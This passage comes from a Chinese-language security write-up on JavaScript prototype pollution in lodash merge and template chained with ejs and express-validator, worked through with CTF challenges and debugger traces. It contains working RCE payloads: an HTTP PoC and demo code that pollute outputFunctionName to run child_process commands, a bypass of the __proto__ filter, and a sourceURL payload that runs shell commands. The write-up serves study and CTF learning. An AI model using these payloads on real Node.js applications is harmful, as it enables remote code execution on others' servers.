</span></span><span style=display:flex><span>    <span style=color:#111>&lt;</span><span style=color:#f92672>title</span><span style=color:#111>&gt;&lt;/</span><span style=color:#f92672>title</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>head</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;</span><span style=color:#f92672>h1</span><span style=color:#111>&gt;</span><span style=color:#960050;background-color:#1e0010>&lt;</span>%= message%&gt;<span style=color:#111>&lt;/</span><span style=color:#f92672>h1</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>body</span><span style=color:#111>&gt;</span>
</span></span><span style=display:flex><span><span style=color:#111>&lt;/</span><span style=color:#f92672>html</span><span style=color:#111>&gt;</span>
</span></span></code></pre></div><p>poc</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#75af00>POST</span> <span style=color:#111>/</span> <span style=color:#00a8c8>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span><span style=color:#111>Host</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>192.168.18.1:3000</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Type</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>multipart/form-data; boundary=--------1566035451</span>
</span></span><span style=display:flex><span><span style=color:#111>Content-Length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>202</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------1566035451
</span></span><span style=display:flex><span>Content-Disposition: form-data; name=&#34;__proto__.outputFunctionName&#34;;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>_tmp1;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;calc&#39;);var __tmp2
</span></span><span style=display:flex><span>----------1566035451--
</span></span></code></pre></div><p>与上面相同，发送poc后刷新页面即可弹计算器</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216164651808.png alt=image-20211216164651808></p><h4 id=lodashmerge>lodash.merge</h4><ul><li>版本要求：lodash &lt; 4.17.11; 4.17.4之后过滤关键词<code>__proto__</code>，可用<code>Object.constructor.prototype</code>进行绕过</li></ul><p>server.js</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>lodash</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>ejs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//设置模板的位置与种类
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>__dirname</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;views engine&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//对原型进行污染 __proto__.xxx
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>var</span> <span style=color:#75af00>malicious_payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;{&#34;__proto__&#34;:{&#34;outputFunctionName&#34;:&#34;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&#34;}}&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 4.17.4之后版本进行`__proto__`过滤 使用Object.constructor.prototype绕过
</span></span></span><span style=display:flex><span><span style=color:#75715e>// var malicious_payload = &#39;{&#34;Object&#34;:{&#34;constructor&#34;:{&#34;prototype&#34;:{&#34;outputFunctionName&#34;: &#34;_tmp1;global.process.mainModule.constructor._load(\&#39;child_process\&#39;).execSync(\&#39;calc\&#39;);var __tmp2&#34;}}}}&#39;
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>merge</span><span style=color:#111>({},</span> <span style=color:#75af00>JSON</span><span style=color:#111>.</span><span style=color:#75af00>parse</span><span style=color:#111>(</span><span style=color:#75af00>malicious_payload</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//进行渲染
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span> <span style=color:#111>(</span><span style=color:#d88200>&#34;index.ejs&#34;</span><span style=color:#111>,{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>message</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;whoami test&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>});</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server</span> <span style=color:#f92672>=</span> <span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>8000</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>()</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>host</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>address</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>var</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#75af00>server</span><span style=color:#111>.</span><span style=color:#75af00>address</span><span style=color:#111>().</span><span style=color:#75af00>port</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;应用实例，访问地址为 http://%s:%s&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>host</span><span style=color:#111>,</span> <span style=color:#75af00>port</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>});</span>
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216193535948.png alt=image-20211216193535948></p><p>在第12行下断点</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216194516601.png alt=image-20211216194516601></p><p>可以看到在它执行结束之后Object的原型链上多了一个<code>outputFunctionName</code>，我们先跟进调用看看后面接入ejs的部分是怎么执行的；在16行打断点，刷新后看render方法</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202304738.png alt=image-20211216202304738></p><p>跟入app.render()，express\lib\application.js</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202413998.png alt=image-20211216202413998></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216202548944.png alt=image-20211216202548944></p><p>跟进view.render()，express\lib\view.js</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216205348481.png alt=image-20211216205348481></p><p>可见我们的恶意代码部分被以options参数的形式加载到了this.engine中，之后engine选用ejs模板引擎，进入ejs\lib\ejs.js</p><p>进入renderFile函数，返回tryHandleCache()，跟入</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204703770.png alt=image-20211216204703770></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204731800.png alt=image-20211216204731800></p><p>跟入compile，这里有大量的字符串拼接，我们的恶意代码就这样被拼进去了</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216204911158.png alt=image-20211216204911158></p><p>这里的<code>opts.outputFunctionName</code>正是我们污染的<code>opts.__proto__outputFunctionName</code>，也就是一开始进入render的opts</p><p>倒叙了属于是，看一下这个lodash.merge的整个过程</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141129212.png alt=image-20211223141129212></p><p>注意到这里的函数和注释，就很有原型污染的可能啊</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211216213329296.png alt=image-20211216213329296></p><p>当我们的payload从这里传入的时候，在进入<code>baseMergeDeep</code>之后会先有一个<code>safeGet</code>的过滤</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142008142.png alt=image-20211223142008142></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223141632227.png alt=image-20211223141632227></p><p>但是我们用<code>prototype</code>就轻松绕过了，之后<code>srcvalue</code>被赋给<code>newValue</code>，进入<code>assignMergeValue</code>，调用一次<code>baseAssginValue</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142953795.png alt=image-20211223142953795></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223142803073.png alt=image-20211223142803073></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223143141313.png alt=image-20211223143141313></p><p>彻底将<code>prototype</code>的值赋给我们的payload，做到原型污染</p><h4 id=lodashtemplate>lodash.template</h4><p>直接拿p牛的题举例了，这个洞是最近不久才被修复，不过虽然这里利用的同样是<code>lodash.merge</code>，不过却和上面的<code>lodash.merge</code>不是一条调用链，所以受影响版本不同</p><h5 id=codebreaking-2018thejs>[Codebreaking 2018]Thejs</h5><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>fs</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>bodyParser</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;body-parser&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>lodash</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;lodash&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>session</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-session&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>randomize</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;randomatic&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>bodyParser</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span><span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span><span style=color:#111>})).</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>bodyParser</span><span style=color:#111>.</span><span style=color:#75af00>json</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/static&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span><span style=color:#d88200>&#39;static&#39;</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>session</span><span style=color:#111>({</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>name</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;thejs.session&#39;</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>secret</span><span style=color:#f92672>:</span> <span style=color:#75af00>randomize</span><span style=color:#111>(</span><span style=color:#d88200>&#39;aA0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>16</span><span style=color:#111>),</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>resave</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>saveUninitialized</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span>
</span></span><span style=display:flex><span><span style=color:#111>}))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>engine</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span> <span style=color:#111>(</span><span style=color:#75af00>filePath</span><span style=color:#111>,</span> <span style=color:#75af00>options</span><span style=color:#111>,</span> <span style=color:#75af00>callback</span><span style=color:#111>)</span> <span style=color:#111>{</span> <span style=color:#75715e>// define the template engine
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#75af00>filePath</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>content</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>)</span> <span style=color:#00a8c8>return</span> <span style=color:#75af00>callback</span><span style=color:#111>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>Error</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>let</span> <span style=color:#75af00>compiled</span> <span style=color:#f92672>=</span> <span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>template</span><span style=color:#111>(</span><span style=color:#75af00>content</span><span style=color:#111>)</span>	<span style=color:#75715e>// 继承自lodash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#00a8c8>let</span> <span style=color:#75af00>rendered</span> <span style=color:#f92672>=</span> <span style=color:#75af00>compiled</span><span style=color:#111>({...</span><span style=color:#75af00>options</span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#75af00>callback</span><span style=color:#111>(</span><span style=color:#00a8c8>null</span><span style=color:#111>,</span> <span style=color:#75af00>rendered</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;views&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;./views&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>set</span><span style=color:#111>(</span><span style=color:#d88200>&#39;view engine&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;ejs&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>all</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>let</span> <span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>data</span> <span style=color:#f92672>||</span> <span style=color:#111>{</span><span style=color:#75af00>language</span><span style=color:#f92672>:</span> <span style=color:#111>[],</span> <span style=color:#75af00>category</span><span style=color:#f92672>:</span> <span style=color:#111>[]}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>lodash</span><span style=color:#111>.</span><span style=color:#75af00>merge</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>,</span> <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>body</span><span style=color:#111>)</span>	<span style=color:#75715e>// 可以原型链污染lodash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#75af00>data</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;index&#39;</span><span style=color:#111>,</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>language</span><span style=color:#f92672>:</span> <span style=color:#75af00>data</span><span style=color:#111>.</span><span style=color:#75af00>language</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>category</span><span style=color:#f92672>:</span> <span style=color:#75af00>data</span><span style=color:#111>.</span><span style=color:#75af00>category</span>
</span></span><span style=display:flex><span>    <span style=color:#111>})</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>3000</span><span style=color:#111>,</span> <span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`Example app listening on port 3000!`</span><span style=color:#111>))</span>
</span></span></code></pre></div><p>我们可以通过污染<code>loadsh.merge</code>给<code>Object</code>对象插入任意属性，最后污染<code>loadsh.template</code>；具体污染<code>lodash.template</code>的哪个属性，还要参考源码</p><pre tabindex=0><code>// https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165
// Use a sourceURL for easier debugging.
var sourceURL = &#39;sourceURL&#39; in options ? &#39;//# sourceURL=&#39; + options.sourceURL + &#39;\n&#39; : &#39;&#39;;
// ...
var result = attempt(function() {
  return Function(importsKeys, sourceURL + &#39;return &#39; + source)
  .apply(undefined, importsValues);
});
</code></pre><p><code>options.sourceURL</code>没有赋值，取空字符串，我们给所有<code>Object</code>对象插入一个<code>sourceURL</code>属性，就会被拼入<code>return Function</code>的第二个参数中造成rce</p><p>payload</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#111>{</span><span style=color:#f92672>&#34;__proto__&#34;</span><span style=color:#111>:{</span><span style=color:#f92672>&#34;sourceURL&#34;</span><span style=color:#111>:</span><span style=color:#d88200>&#34;\u000areturn e=&gt;{for(var a in {}){delete Object.prototype[a];}return global.process.mainModule.consturctor._load(&#39;child_process&#39;).execSync(&#39;ls /&#39;).toString()}\u000a//&#34;</span><span style=color:#111>}}</span>
</span></span></code></pre></div><h3 id=借助其它库扩大攻击面>借助其它库扩大攻击面</h3><h4 id=express-validator--lodash>express-validator + lodash</h4><ul><li>lodash&lt;4.17.17</li></ul><p>来源于一道CTF题（而且被抄了2次还），在本身lodash存在原型污染的情况下结合其它库扩大攻击面</p><h5 id=xnucactf-2020-qualifieroooooooldjs>[XNUCACTF 2020 Qualifier]oooooooldjs</h5><p>这个题有三个考点，还是肥肠的难顶的</p><ul><li>原型链污染：lodash.set + express-validator</li><li>异步bug</li><li>jQuery RCE gadget</li></ul><h6 id=express-validator的具体实现>express-validator的具体实现</h6><p>我们以一段代码作为示例</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>express</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>app</span> <span style=color:#f92672>=</span> <span style=color:#75af00>express</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#75af00>port</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#75af00>json</span><span style=color:#111>())</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>express</span><span style=color:#111>.</span><span style=color:#75af00>urlencoded</span><span style=color:#111>({</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>extended</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>true</span>
</span></span><span style=display:flex><span><span style=color:#111>}))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>const</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>body</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>validationResult</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span> <span style=color:#f92672>=</span> <span style=color:#75af00>require</span><span style=color:#111>(</span><span style=color:#d88200>&#39;express-validator&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>middlewares</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>body</span><span style=color:#111>(</span><span style=color:#d88200>&#39;*&#39;</span><span style=color:#111>).</span><span style=color:#75af00>trim</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>]</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>middlewares</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>post</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/user&#34;</span><span style=color:#111>,</span> <span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>,</span> <span style=color:#75af00>res</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>const</span> <span style=color:#75af00>foo</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;helloworld&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>status</span><span style=color:#111>(</span><span style=color:#ae81ff>200</span><span style=color:#111>).</span><span style=color:#75af00>send</span><span style=color:#111>(</span><span style=color:#75af00>foo</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>listen</span><span style=color:#111>(</span><span style=color:#75af00>port</span><span style=color:#111>,()=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>`server listening on </span><span style=color:#d88200>${</span><span style=color:#75af00>port</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span></code></pre></div><p>其中第16行的<code>body('*').trim()</code>是对validator这一中间件的设置，可以在<code>node_modules\express-validator\src\middlewares\validation-chain-builders.js</code>中找到它的具体实现</p><p>首先是对body, cookie, header, param, query这几个对象都是对<code>buildCheckFunction(['xxxx'])</code>的封装，用来实现validator的功能</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223211308807.png alt=image-20211223211308807></p><p>如果我们在第6行下断点 可以看到对应的参数在依次传入并返回，它其实是调用了<code>node_modules\express-validator\src\middlewares\check.js</code>中<code>check</code>的实现</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213051362.png alt=image-20211223213051362></p><p>先看返回值，<code>Object.assign()</code>函数，首先是<code>utils_1.bindall()</code>函数将传入对象的函数作为对象的一个属性进行绑定</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223213347228.png alt=image-20211223213347228></p><p>之后再传入<code>Object.assign</code>，将<code>sanitizers</code>和<code>validators</code>浅拷贝到<code>middleware</code>上，就可以通过这个<code>middleware</code>调用所有的验证和过滤函数</p><p>之后进入<code>express-validator\src\chain\context-runner-impl.js</code>看到<code>trim()</code>，跟入调用</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223222949602.png alt=image-20211223222949602></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223012489.png alt=image-20211223223012489></p><p><code>express-validator\src\context-builder.js</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223223052594.png alt=image-20211223223052594></p><p>芜，竟然是一个入栈操作，把传入的值压入栈中</p><p>回过头去看<code>this.builder.addItem</code>，传入的是以<code>trim</code>为参数的<code>Sanitization</code>对象，为<code>builder</code>增加一个<code>sanitization</code>后返回<code>this.chain</code>即<code>middleware</code>，做到链式调用</p><p>跟入这个<code>Sanitization</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211223231735649.png 